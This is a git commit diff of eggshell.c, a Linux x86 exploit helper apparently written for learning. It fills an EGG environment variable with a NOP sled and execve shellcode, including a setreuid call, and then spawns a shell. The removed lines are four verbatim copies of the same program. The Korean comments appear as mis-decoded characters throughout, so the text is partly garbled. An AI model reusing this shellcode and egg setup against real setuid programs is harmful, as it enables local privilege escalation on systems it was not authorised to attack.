ea4910e49f08faa598a12c935d74790f7baba8d8
JangHanbin <espoirnoa09@naver.com>
2018-03-26 06:29:23 +0900

    Update eggshell.c

--- eggshell.c
+++ eggshell.c
@@ -22,7 +22,7 @@ char shellcode[] ="\x31\xc0"
 "\xcd\x80"
 "\x31\xc0\xb0\x01\xcd\x80";
 unsigned long get_esp(){
-    __asm__ __volatile__("movl %esp, %eax"); /* espÀÇ address¸¦ return */
+    __asm__ __volatile__("movl %esp, %eax"); /* espì˜ addressë¥¼ return */
 }
 int main(int argc, char **argv){
     char *ptr, *egg;
@@ -32,225 +32,20 @@ int main(int argc, char **argv){
     if(argc > 1) bsize = atoi(argv[1]);
     if(argc > 2) offset = atoi(argv[2]);
     if(argc > 3) eggsize = atoi(argv[3]);
-    if(!(egg = malloc(eggsize))){ /* NOP¿Í ½© ÄÚµå¸¦ ³ÖÀ» ¹öÆÛ »ı¼º */
+    if(!(egg = malloc(eggsize))){ /* NOPì™€ ì‰˜ ì½”ë“œë¥¼ ë„£ì„ ë²„í¼ ìƒì„± */
         printf("Cannot allocate egg.\n");
         exit(0);
     }
-    addr = get_esp() - offset; /* stack pointer¸¦ ¾ò¾î ¿È */
-    printf("esp : %p\n", addr); /* esp °ª Ãâ·Â */
+    addr = get_esp() - offset; /* stack pointerë¥¼ ì–»ì–´ ì˜´ */
+    printf("esp : %p\n", addr); /* esp ê°’ ì¶œë ¥ */
     ptr = egg;
     for(i=0; i<eggsize - strlen(shellcode) -1 ; i++)
-        *(ptr++) = NOP; /* egg¸¦ NOP·Î ¸ÕÀú Ã¤¿ì°í */
+        *(ptr++) = NOP; /* eggë¥¼ NOPë¡œ ë¨¼ì € ì±„ìš°ê³  */
     for(i=0 ; i<strlen(shellcode) ; i++)
-        *(ptr++) = shellcode[i]; /* ³²Àº °ø°£À» ½© ÄÚµå·Î Ã¤¿ò */
+        *(ptr++) = shellcode[i]; /* ë‚¨ì€ ê³µê°„ì„ ì‰˜ ì½”ë“œë¡œ ì±„ì›€ */
     egg[eggsize-1] = '\0';
     memcpy(egg, "EGG=",4);
     putenv(egg);
     system("/bin/bash");
-    /* EGG¶ó´Â È¯°æ º¯¼ö·Î µî·Ï */ /* È¯°æ º¯¼ö°¡ Àû¿ëµÈ ½© ½ÇÇà */
+    /* EGGë¼ëŠ” í™˜ê²½ ë³€ìˆ˜ë¡œ ë“±ë¡ */ /* í™˜ê²½ ë³€ìˆ˜ê°€ ì ìš©ëœ ì‰˜ ì‹¤í–‰ */
 }
-#include<stdlib.h>
-
-#define _OFFSET 0
-#define _BUFFER_SIZE 512
-#define _EGG_SIZE 2048
-#define NOP 0x90
-
-char shellcode[] ="\x31\xc0"
-"\x31\xdb"
-"\xb0\x46"
-"\xcd\x80"
-"\x31\xc0"
-"\x50"
-"\x68\x2f\x2f\x73\x68"
-"\x68\x2f\x62\x69\x6e"
-"\x89\xe3"
-"\x50"
-"\x53"
-"\x89\xe1"
-"\x89\xc2"
-"\xb0\x0b"
-"\xcd\x80"
-"\x31\xc0\xb0\x01\xcd\x80";
-unsigned long get_esp(){
-    __asm__ __volatile__("movl %esp, %eax"); /* espÀÇ address¸¦ return */
-}
-int main(int argc, char **argv){
-    char *ptr, *egg;
-    long *addr_ptr, addr;
-    int i;
-    int offset = _OFFSET, bsize = _BUFFER_SIZE, eggsize = _EGG_SIZE;
-    if(argc > 1) bsize = atoi(argv[1]);
-    if(argc > 2) offset = atoi(argv[2]);
-    if(argc > 3) eggsize = atoi(argv[3]);
-    if(!(egg = malloc(eggsize))){ /* NOP¿Í ½© ÄÚµå¸¦ ³ÖÀ» ¹öÆÛ »ı¼º */
-        printf("Cannot allocate egg.\n");
-        exit(0);
-    }
-    addr = get_esp() - offset; /* stack pointer¸¦ ¾ò¾î ¿È */
-    printf("esp : %p\n", addr); /* esp °ª Ãâ·Â */
-    ptr = egg;
-    for(i=0; i<eggsize - strlen(shellcode) -1 ; i++)
-        *(ptr++) = NOP; /* egg¸¦ NOP·Î ¸ÕÀú Ã¤¿ì°í */
-    for(i=0 ; i<strlen(shellcode) ; i++)
-        *(ptr++) = shellcode[i]; /* ³²Àº °ø°£À» ½© ÄÚµå·Î Ã¤¿ò */
-    egg[eggsize-1] = '\0';
-    memcpy(egg, "EGG=",4);
-    putenv(egg);
-    system("/bin/bash");
-    /* EGG¶ó´Â È¯°æ º¯¼ö·Î µî·Ï */ /* È¯°æ º¯¼ö°¡ Àû¿ëµÈ ½© ½ÇÇà */
-}
-#include<stdlib.h>
-
-#define _OFFSET 0
-#define _BUFFER_SIZE 512
-#define _EGG_SIZE 2048
-#define NOP 0x90
-
-char shellcode[] ="\x31\xc0"
-"\x31\xdb"
-"\xb0\x46"
-"\xcd\x80"
-"\x31\xc0"
-"\x50"
-"\x68\x2f\x2f\x73\x68"
-"\x68\x2f\x62\x69\x6e"
-"\x89\xe3"
-"\x50"
-"\x53"
-"\x89\xe1"
-"\x89\xc2"
-"\xb0\x0b"
-"\xcd\x80"
-"\x31\xc0\xb0\x01\xcd\x80";
-unsigned long get_esp(){
-    __asm__ __volatile__("movl %esp, %eax"); /* espÀÇ address¸¦ return */
-}
-int main(int argc, char **argv){
-    char *ptr, *egg;
-    long *addr_ptr, addr;
-    int i;
-    int offset = _OFFSET, bsize = _BUFFER_SIZE, eggsize = _EGG_SIZE;
-    if(argc > 1) bsize = atoi(argv[1]);
-    if(argc > 2) offset = atoi(argv[2]);
-    if(argc > 3) eggsize = atoi(argv[3]);
-    if(!(egg = malloc(eggsize))){ /* NOP¿Í ½© ÄÚµå¸¦ ³ÖÀ» ¹öÆÛ »ı¼º */
-        printf("Cannot allocate egg.\n");
-        exit(0);
-    }
-    addr = get_esp() - offset; /* stack pointer¸¦ ¾ò¾î ¿È */
-    printf("esp : %p\n", addr); /* esp °ª Ãâ·Â */
-    ptr = egg;
-    for(i=0; i<eggsize - strlen(shellcode) -1 ; i++)
-        *(ptr++) = NOP; /* egg¸¦ NOP·Î ¸ÕÀú Ã¤¿ì°í */
-    for(i=0 ; i<strlen(shellcode) ; i++)
-        *(ptr++) = shellcode[i]; /* ³²Àº °ø°£À» ½© ÄÚµå·Î Ã¤¿ò */
-    egg[eggsize-1] = '\0';
-    memcpy(egg, "EGG=",4);
-    putenv(egg);
-    system("/bin/bash");
-    /* EGG¶ó´Â È¯°æ º¯¼ö·Î µî·Ï */ /* È¯°æ º¯¼ö°¡ Àû¿ëµÈ ½© ½ÇÇà */
-}
-#include<stdlib.h>
-
-#define _OFFSET 0
-#define _BUFFER_SIZE 512
-#define _EGG_SIZE 2048
-#define NOP 0x90
-
-char shellcode[] ="\x31\xc0"
-"\x31\xdb"
-"\xb0\x46"
-"\xcd\x80"
-"\x31\xc0"
-"\x50"
-"\x68\x2f\x2f\x73\x68"
-"\x68\x2f\x62\x69\x6e"
-"\x89\xe3"
-"\x50"
-"\x53"
-"\x89\xe1"
-"\x89\xc2"
-"\xb0\x0b"
-"\xcd\x80"
-"\x31\xc0\xb0\x01\xcd\x80";
-unsigned long get_esp(){
-    __asm__ __volatile__("movl %esp, %eax"); /* espÀÇ address¸¦ return */
-}
-int main(int argc, char **argv){
-    char *ptr, *egg;
-    long *addr_ptr, addr;
-    int i;
-    int offset = _OFFSET, bsize = _BUFFER_SIZE, eggsize = _EGG_SIZE;
-    if(argc > 1) bsize = atoi(argv[1]);
-    if(argc > 2) offset = atoi(argv[2]);
-    if(argc > 3) eggsize = atoi(argv[3]);
-    if(!(egg = malloc(eggsize))){ /* NOP¿Í ½© ÄÚµå¸¦ ³ÖÀ» ¹öÆÛ »ı¼º */
-        printf("Cannot allocate egg.\n");
-        exit(0);
-    }
-    addr = get_esp() - offset; /* stack pointer¸¦ ¾ò¾î ¿È */
-    printf("esp : %p\n", addr); /* esp °ª Ãâ·Â */
-    ptr = egg;
-    for(i=0; i<eggsize - strlen(shellcode) -1 ; i++)
-        *(ptr++) = NOP; /* egg¸¦ NOP·Î ¸ÕÀú Ã¤¿ì°í */
-    for(i=0 ; i<strlen(shellcode) ; i++)
-        *(ptr++) = shellcode[i]; /* ³²Àº °ø°£À» ½© ÄÚµå·Î Ã¤¿ò */
-    egg[eggsize-1] = '\0';
-    memcpy(egg, "EGG=",4);
-    putenv(egg);
-    system("/bin/bash");
-    /* EGG¶ó´Â È¯°æ º¯¼ö·Î µî·Ï */ /* È¯°æ º¯¼ö°¡ Àû¿ëµÈ ½© ½ÇÇà */
-}
-#include<stdlib.h>
-
-#define _OFFSET 0
-#define _BUFFER_SIZE 512
-#define _EGG_SIZE 2048
-#define NOP 0x90
-
-char shellcode[] ="\x31\xc0"
-"\x31\xdb"
-"\xb0\x46"
-"\xcd\x80"
-"\x31\xc0"
-"\x50"
-"\x68\x2f\x2f\x73\x68"
-"\x68\x2f\x62\x69\x6e"
-"\x89\xe3"
-"\x50"
-"\x53"
-"\x89\xe1"
-"\x89\xc2"
-"\xb0\x0b"
-"\xcd\x80"
-"\x31\xc0\xb0\x01\xcd\x80";
-unsigned long get_esp(){
-    __asm__ __volatile__("movl %esp, %eax"); /* espÀÇ address¸¦ return */
-}
-int main(int argc, char **argv){
-    char *ptr, *egg;
-    long *addr_ptr, addr;
-    int i;
-    int offset = _OFFSET, bsize = _BUFFER_SIZE, eggsize = _EGG_SIZE;
-    if(argc > 1) bsize = atoi(argv[1]);
-    if(argc > 2) offset = atoi(argv[2]);
-    if(argc > 3) eggsize = atoi(argv[3]);
-    if(!(egg = malloc(eggsize))){ /* NOP¿Í ½© ÄÚµå¸¦ ³ÖÀ» ¹öÆÛ »ı¼º */
-        printf("Cannot allocate egg.\n");
-        exit(0);
-    }
-    addr = get_esp() - offset; /* stack pointer¸¦ ¾ò¾î ¿È */
-    printf("esp : %p\n", addr); /* esp °ª Ãâ·Â */
-    ptr = egg;
-    for(i=0; i<eggsize - strlen(shellcode) -1 ; i++)
-        *(ptr++) = NOP; /* egg¸¦ NOP·Î ¸ÕÀú Ã¤¿ì°í */
-    for(i=0 ; i<strlen(shellcode) ; i++)
-        *(ptr++) = shellcode[i]; /* ³²Àº °ø°£À» ½© ÄÚµå·Î Ã¤¿ò */
-    egg[eggsize-1] = '\0';
-    memcpy(egg, "EGG=",4);
-    putenv(egg);
-    system("/bin/bash");
-    /* EGG¶ó´Â È¯°æ º¯¼ö·Î µî·Ï */ /* È¯°æ º¯¼ö°¡ Àû¿ëµÈ ½© ½ÇÇà */
-}
-
